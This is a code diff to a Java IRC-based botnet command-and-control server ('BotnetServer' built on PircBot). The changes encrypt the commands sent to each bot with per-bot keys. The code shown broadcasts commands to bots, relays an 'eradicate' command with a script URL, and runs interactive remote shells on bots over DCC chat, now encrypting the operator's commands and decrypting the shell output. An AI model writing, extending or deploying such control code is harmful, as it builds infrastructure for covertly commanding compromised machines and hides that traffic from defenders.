@@ -90,11 +90,6 @@ public class BotnetServer extends PircBot {
 		input = new Scanner(System.in);
 		try {
 			botKeys = new HashMap<String, MsgEncrypt>();
-			//masterKey = MsgEncrypt.getStartKey();
-			//masterKey = new SecretKeySpec(key, "DESede");
-			//masterCipher = Cipher.getInstance("AES");
-			//masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
-			//masterMsgE = MsgEncrypt.getInstance(masterKey);
 			
 			setVerbose(DEBUG);
 			setName(NAME);
@@ -110,31 +105,6 @@ public class BotnetServer extends PircBot {
 		}
 	}
 	
-	// TODO: put this into the MsgEncrypt object as a static method
-	/*protected Key genCCBotKey() throws Exception {
-		AlgorithmParameterGenerator paramGen = AlgorithmParameterGenerator.getInstance("DH");
-		paramGen.init(1024);
-		AlgorithmParameters params = paramGen.generateParameters();
-
-		DHParameterSpec dhSpec = (DHParameterSpec)params.getParameterSpec(DHParameterSpec.class);
-
-		KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DH");
-		
-		keyGen.initialize(dhSpec);
-		
-		KeyPair aKeyPair = keyGen.generateKeyPair();
-		KeyPair bKeyPair = keyGen.generateKeyPair();
-		
-		// This give the public keys...
-		Key aPubKey = aKeyPair.getPublic();
-		Key bPubKey = bKeyPair.getPublic();
-		
-		MsgEncrypt msgE = MsgEncrypt.getInstance(aKeyPair, bPubKey);
-		MsgEncrypt m2 = MsgEncrypt.getInstance(bKeyPair, aPubKey);
-		Key privKey = msgE.getPrivateKey();
-		return privKey;
-	}*/
-	
 	protected void onConnect() {
 		joinChannel(CHANNEL);
 		setMode(CHANNEL, "s");
@@ -148,17 +118,6 @@ public class BotnetServer extends PircBot {
 				PubInfo info = MsgEncrypt.getPubParams();
 				MsgEncrypt m = MsgEncrypt.getInstance();
 				m.setPubParams(info.toString());
-				//String stuff = "key " + m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::") + " " + info.toString();
-				//System.out.println(stuff.length() + " " + stuff.replace("\\", "\\\\").split("\n").length);
-				//System.out.println(Arrays.toString(stuff.split("\n")));
-				//String stuff2 = "";
-				//for (String s : stuff.split("\n")) {
-				//	stuff2 += s + " blah ";
-				//} 
-				//System.out.println("\n\n:" + stuff2 + ":\n\n");
-				//sendMessage(bots[i].getNick(), stuff2);
-				//sendMessage(bots[i].getNick(), stuff);
-				//botKeys.put(bots[i].getNick(), m);
 				try {
 					DccChat chat = dccSendChatRequest(bots[i].getNick(), TIMEOUT);
 					if (chat == null) {
@@ -192,18 +151,6 @@ public class BotnetServer extends PircBot {
 	
 	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
 		System.out.println("<" + sender + ">: " + message);
-	}
-	
-	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
-		if (message.toLowerCase().startsWith("key")) {
-			String[] parts = message.split(" ", 2);
-			if (!botKeys.containsKey(sender) && parts.length > 1) {
-				//botKeys.put(sender, new MsgEncrypt(parts[1]);
-				MsgEncrypt m = botKeys.get(sender);
-				m.handShake(parts[1]);
-				botKeys.put(sender, m);
-			}
-		}
 	}
 	
 	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
@@ -277,8 +224,8 @@ public class BotnetServer extends PircBot {
 				for (String name : botNames) {
 					if (!name.equals(NAME)) {
 						// TODO: encrypt command
-						this.sendMessage(name, command);
-						//this.sendMessage(name, masterMsgE.encryptMsg(command));
+						//this.sendMessage(name, command);
+						this.sendMessage(name, botKeys.get(name).encryptMsg(command));
 					}
 				}
 			}
@@ -336,8 +283,8 @@ public class BotnetServer extends PircBot {
 					}
 					for (String name : bots) {
 						// TODO: encrypt command
-						sendMessage(name, command);
-						//sendMessage(name, masterMsgE.encryptMsg(command));
+						//sendMessage(name, command);
+						sendMessage(name, botKeys.get(name).encryptMsg(command));
 					}
 				}
 			} catch (Exception e) {
@@ -349,21 +296,23 @@ public class BotnetServer extends PircBot {
 			String[] parts = s.split(" ");
 			String[] bots = chooseBots(parts, 1);
 			for (String name : bots) {
-				sendMessage(name, parts[0]);
+				//sendMessage(name, parts[0]);
+				sendMessage(name, botKeys.get(name).encryptMsg(parts[0]));
 			}
 		//Respond to an eradicate command by sending it along with the clean script url to each bot
 		} else if (s.toLowerCase().startsWith("eradicate")) {
 			String[] parts = s.split(" ");
 			String[] bots = chooseBots(parts, 2);
 			for (String name : bots) {
-				sendMessage(name, parts[0] + " " + parts[1]);
+				String command = parts[0] + " " + parts[1];
+				sendMessage(name, botKeys.get(name).encryptMsg(command));
 			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
 		} else if (s.startsWith(":")) {
 			// TODO: encrypt s.substring
 			String[] bots = getUserNames();
 			for (String name : bots) {
-				sendMessage(name, s.substring(1));
+				sendMessage(name, botKeys.get(name).encryptMsg(s.substring(1)));
 			}
 			//sendMessage(CHANNEL, masterMsgE.encryptMsg(s.substring(1)));
 		//Respond to all other messages by sending the message raw to the IRC server
@@ -452,9 +401,11 @@ public class BotnetServer extends PircBot {
 			Scanner shellout = new Scanner(chat.getBufferedReader());
 			
 			try {
-				chat.sendLine("shell");
+				//chat.sendLine("shell");
+				chat.sendLine(botKeys.get(botNick).encryptMsg("shell"));
 				// TODO: decrypt this
-				System.out.print(shellout.nextLine());
+				//System.out.print(shellout.nextLine());
+				System.out.println(botKeys.get(botNick).decryptMsg(shellout.nextLine()));
 				//String msg = shellout.nextLine();
 				//System.out.println(msg);
 				//System.out.println(masterMsgE.decryptMsg(msg));
@@ -462,22 +413,22 @@ public class BotnetServer extends PircBot {
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
 					// TODO: make this encrypted
-					//chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
-					chat.sendLine(command);
+					chat.sendLine(botKeys.get(botNick).encryptMsg(command)); // Made this encrypted
+					//chat.sendLine(command);
 					// TODO: decrypt this
-					String response = shellout.nextLine();
-					//String response = masterMsgE.decryptMsg(shellout.nextLine());
+					//String response = shellout.nextLine();
+					String response = botKeys.get(botNick).decryptMsg(shellout.nextLine());
 					while (!response.endsWith(SENTINEL)) {
 						System.out.println("\t" + response);
 						// TODO: decrypt this
-						response = shellout.nextLine();
-						//response = masterMsgE.decryptMsg(shellout.nextLine());
+						//response = shellout.nextLine();
+						response = botKeys.get(botNick).decryptMsg(shellout.nextLine());
 					}
 					System.out.print(response);
 					command = input.nextLine();
 				}
-				chat.sendLine(command);
-				//chat.sendLine(masterMsgE.encryptMsg(command));
+				//chat.sendLine(command);
+				chat.sendLine(botKeys.get(botNick).encryptMsg(command));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
